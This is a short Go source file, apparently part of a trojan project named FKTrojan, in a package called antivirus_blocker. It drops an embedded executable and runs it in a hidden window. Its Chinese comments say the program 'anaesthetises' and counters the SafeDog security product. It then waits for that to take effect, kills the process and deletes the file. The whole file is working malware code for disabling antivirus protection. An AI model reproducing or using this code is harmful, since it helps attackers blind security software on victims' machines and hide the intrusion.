package antivirus_blocker

import (
	"FKTrojan/common"
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"
)

func saveAndRunExe() error {
	err := saveWinAnvirExe(anvirFile)
	if err != nil {
		return err
	}
	// 麻醉狗
	cmd := exec.Command(anvirFile, "start")
	// 执行新进程
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	go cmd.Start()
	// 等待反安全狗生效
	time.Sleep(time.Second * 3)

	return nil
}

func killAndRemoveExe() error {
	defer os.Remove(anvirFile)
	_, _, err := common.RunExe(fmt.Sprintf("taskkill /im %s /f", anvirFileName))
	return err
}
